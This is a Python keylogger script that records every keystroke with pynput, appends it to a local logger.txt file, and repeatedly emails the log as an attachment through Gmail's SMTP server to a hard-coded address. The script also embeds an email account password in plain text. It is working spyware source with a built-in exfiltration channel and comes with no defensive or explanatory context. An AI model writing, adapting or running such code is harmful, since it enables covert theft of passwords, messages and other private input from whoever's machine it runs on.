import pynput
import smtplib
import time
import os
import ssl

from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
from cryptography.fernet import Fernet

address = "olafcdahl@gmail.com"
pwd = "ylhr toez cvne oxip"


def send_email(filename, attachment):
    context=ssl.create_default_context()
    msg = MIMEMultipart() 
    msg['From'] = address 
    msg['To'] = address 
    msg['Subject'] = "logger: " + str(datetime.now())
    body = attachment
    msg.attach(MIMEText(body, 'plain')) 
    attachment = open(attachment, "rb") 
    p = MIMEBase('application', 'octet-stream') 
    p.set_payload((attachment).read()) 
    encoders.encode_base64(p) 
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 
    msg.attach(p) 
    s = smtplib.SMTP('smtp.gmail.com', 587) 
    s.starttls() 
    s.login(address, pwd) 
    text = msg.as_string() 
    s.sendmail(address, address, text)
    s.quit()

iterationTime=5
currentTime=time.time()
nextTime=time.time() + iterationTime
counter=0
runTimes=10000000000000000

count=0
keys=[]

def on_press(key):
    global keys, count, currentTime
    keys.append(key)
    count+=1
    currentTime = time.time()
    
    if count >= 1:
        count=0
        write_file(keys)
        keys=[]

def write_file(keys):
    mode='a'
    if not os.path.exists("logger.txt"):
       file_mode = 'w'
    with open("logger.txt", mode) as f:
        for key in keys:
            k=str(key).replace("'", "")
            if k.find("space") > 0 or k.find("enter") > 0:
                f.write('\n')
            elif k.startswith("Key"):
                pass
            else:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False
    if currentTime > nextTime:
        return False

while counter < runTimes:
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    absolute_path = os.path.abspath("logger.txt")
    send_email("logger.txt",absolute_path)
    if currentTime > nextTime:
        with open("logger.txt", 'w') as f:
            f.write(" ")
    counter+=1
    currentTime=time.time()
    nextTime=time.time()+iterationTime
    

